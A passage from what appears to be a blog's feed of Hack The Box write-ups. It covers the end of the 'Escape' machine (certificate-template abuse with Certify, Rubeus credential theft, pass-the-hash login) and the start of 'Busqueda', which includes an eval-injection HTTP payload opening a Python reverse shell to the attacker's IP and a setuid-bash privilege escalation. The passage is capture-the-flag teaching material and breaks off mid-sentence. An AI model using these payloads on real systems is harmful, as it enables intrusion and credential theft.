+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Template&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Name&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;UserAuthentication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Schema&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Validity&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Period&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;years&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Renewal&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Period&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;weeks&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msPKI-Certificate-Name-Flag&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;          &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;ENROLLEE_SUPPLIES_SUBJECT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mspki-enrollment-flag&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;                 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;INCLUDE_SYMMETRIC_ALGORITHMS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PUBLISH_TO_DS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Authorized&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Signatures&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Required&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;        &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\Users\Ryan.Cooper\Documents&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Certify.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/ca:dc.sequel.htb\sequel-DC-CA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/template:UserAuthentication&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/altname:administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CERTIFICATE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;openssl&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;pkcs12&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-in&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cert.pem&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-keyex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-CSP&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Microsoft Enhanced Cryptographic Provider v1.0&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-export&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-out&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cert.pfx&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I’ve downloaded the certificate on my machine and ran the command to convert it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pfx&lt;/code&gt; and I’ve uploaded it back to the server.&lt;/p&gt;
+
+&lt;p&gt;Using another tool called &lt;a href=&quot;https://github.com/GhostPack/Rubeus&quot;&gt;Rubeus&lt;/a&gt; that I’ve used to send raw request for a TGT towards the DC.&lt;/p&gt;
+
+&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;/Rubeus.exe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asktgt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/user:administrator&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/certificate:cert.pfx&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/getcredentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;/password:123&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Action:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Ask&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;TGT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PKINIT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;with&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;etype&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc4_hmac&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;and&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;subject:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ryan.Cooper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sequel&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;DC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;htb&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Building&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;AS-REQ&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;w/&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;PKINIT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preauth&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;sequel.htb\administrator&apos;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;Using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;domain&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;controller:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;fe80::5438:a078:e66d:b560&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;4:88&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TGT&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;successful&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ticket.kirbi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;...&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Getting&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;credentials&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;U2U&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+
+  &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CredentialInfo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Version&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EncryptionType&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;rc4_hmac&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+    &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CredentialData&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+      &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CredentialCount&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+       &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;NTLM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;              &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;NTLM&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;HASH&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.&lt;/p&gt;
+
+&lt;p&gt;I can use that with:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ evil-winrm -H &quot;&amp;lt;NTLM HASH&amp;gt;&quot; -u &quot;administrator&quot; -i 10.10.11.202
+M* PS C:\Users\Administrator\Documents&amp;gt; gc ../Desktop/root.txt
+&amp;lt;root_hash&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;https://blog.zerospl0it.com/posts/Escape/&lt;/li&gt;
+  &lt;li&gt;https://yu8pentest.blogspot.com/2023/02/escape.html&lt;/li&gt;
+  &lt;li&gt;https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15&lt;/li&gt;
+  &lt;li&gt;https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>Dimitar Ganev</name></author><category term="ctf-writeup" /><summary type="html">This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I’ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.</summary></entry><entry><title type="html">Hack The Box - Busqueda [Easy]</title><link href="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html" rel="alternate" type="text/html" title="Hack The Box - Busqueda [Easy]" /><published>2023-06-10T00:00:00+03:00</published><updated>2023-06-10T00:00:00+03:00</updated><id>http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda</id><content type="html" xml:base="http://localhost:4000/ctf-writeup/2023/06/10/htb-busqueda.html">&lt;p&gt;This machine is rather simple, upon scanning it we can see that the website has a generating search query URLs input form. On the bottom of the page, we can see the versions of the used software:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Powered by Flask and Searchor 2.4.0
+
+$ whatweb 
+Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A simple google search would yield a bug that has been removed in Searchor 2.4.2+ and before that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eval()&lt;/code&gt; was used in the Searchor CLI module. Assuming that the website uses that, we can send the following payload:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /search HTTP/1.1
+Host: searcher.htb
+Content-Length: 67
+Cache-Control: max-age&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0
+Upgrade-Insecure-Requests: 1
+Origin: http://searcher.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Windows NT 10.0&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; Win64&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; AppleWebKit/537.36 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;KHTML, like Gecko&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; Chrome/110.0.5481.78 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9,image/avif,image/webp,image/apng,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.8,application/signed-exchange&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;v&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;b3&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.7
+Referer: http://searcher.htb/
+Accept-Encoding: &lt;span class=&quot;nb&quot;&gt;gzip&lt;/span&gt;, deflate
+Accept-Language: en-US,en&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;q&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0.9
+Connection: close
+
+&lt;span class=&quot;nv&quot;&gt;engine&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Accuweather&amp;amp;query&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,copy_url=__import__(&apos;&lt;/span&gt;os&lt;span class=&quot;s1&quot;&gt;&apos;).system(&quot;&quot;&quot; python3 -c &apos;&lt;/span&gt;import socket,subprocess,os&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;socket.socket&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;socket.AF_INET,socket.SOCK_STREAM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;s.connect&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;myip&amp;gt;&quot;&lt;/span&gt;,4444&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;os.dup2&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s.fileno&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;,2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;import pty&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; pty.spawn&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;bash&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos; &quot;&quot;&quot;))
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This would create a reverse shell to the machine.&lt;/p&gt;
+
+&lt;p&gt;The currently used user is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc&lt;/code&gt; upon running&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;We can see that we can use this command:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect &amp;lt;format&amp;gt; &amp;lt;container_name&amp;gt;
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I also discovered the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts&lt;/code&gt; folder that had some scripts inside, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt;, I’ve run the command in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/scripts/&lt;/code&gt; folder, and it successfully retrieved some information about the currently running services, I tried to run it in a different folder, and it gave me &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Something went wrong&lt;/code&gt;, I’ve created a dummy &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full-checkup.sh&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod +s /bin/bash&lt;/code&gt; contents inside and ran the command again, it just printed out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[+] Done&lt;/code&gt; and after that a simple &lt;code class=&quot;language-plaintext 